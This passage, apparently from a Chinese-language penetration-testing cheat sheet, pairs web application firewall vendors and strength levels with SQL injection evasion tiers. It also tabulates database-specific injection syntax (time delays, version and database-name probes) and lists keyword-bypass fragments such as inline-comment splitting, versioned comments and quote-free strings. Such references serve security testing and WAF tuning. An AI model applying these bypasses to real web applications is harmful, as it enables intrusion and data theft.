| `_incap_` | Imperva | 多样化 + 逻辑等价 |
| `AkamaiGHost` | Akamai | 深层嵌套 + 数据库特性 |

### 技术层次速查

| WAF 强度 | 推荐层次 | 典型技术 |
|---------|---------|---------|
| 弱（黑名单） | L1-L2 | 同义替换 + 注释插入 |
| 中（正则） | L2-L3 | 空白变换 + 编码混淆 |
| 强（语法） | L3-L4 | 编码 + 子查询嵌套 |
| 极强（语义） | L4-L5 | 嵌套 + 逻辑等价 |
| 最强（ML） | L5-L6 | 逻辑混淆 + DB特性 |

### 数据库语法速查

| 操作 | MySQL | PostgreSQL | MSSQL | Oracle |
|------|-------|-----------|-------|--------|
| 字符串拼接 | `CONCAT()` | `||` | `+` | `||` |
| 子串 | `SUBSTRING()` | `SUBSTRING()` | `SUBSTRING()` | `SUBSTR()` |
| 当前库 | `DATABASE()` | `CURRENT_DATABASE()` | `DB_NAME()` | `SYS_CONTEXT(...)` |
| 注释 | `-- `, `#`, `/**/` | `--`, `/**/` | `--`, `/**/` | `--`, `/**/` |
| 延时 | `SLEEP(N)` | `PG_SLEEP(N)` | `WAITFOR DELAY` | `DBMS_LOCK.SLEEP(N)` |
| 版本 | `VERSION()` | `VERSION()` | `@@VERSION` | `BANNER FROM v$version` |
| 字符构造 | `CHAR()` | `CHR()` | `CHAR()` | `CHR()` |

### 关键字绕过速查

| 关键字 | 绕过方法 |
|-------|---------|
| `UNION` | `UnIoN`, `UN/**/ION`, `/*!50000UNION*/`, `UNION%0a` |
| `SELECT` | `SeLeCt`, `SEL/**/ECT`, `/*!50000SELECT*/`, `(SELECT)` |
| `AND` | `&&`, `/**/AND/**/`, `AND%0a`, `AND(...)` |
| `OR` | `||`, `|`, `/**/OR/**/`, `OR(...)` |
| `=` | `LIKE`, `REGEXP`, `BETWEEN...AND`, `IN(...)` |
| `SLEEP` | `BENCHMARK`, 笛卡尔积, `GET_LOCK`, `PG_SLEEP` |
| `'` 单引号 | `CHAR()`, `0x...`, `CONCAT()`, 双引号 |
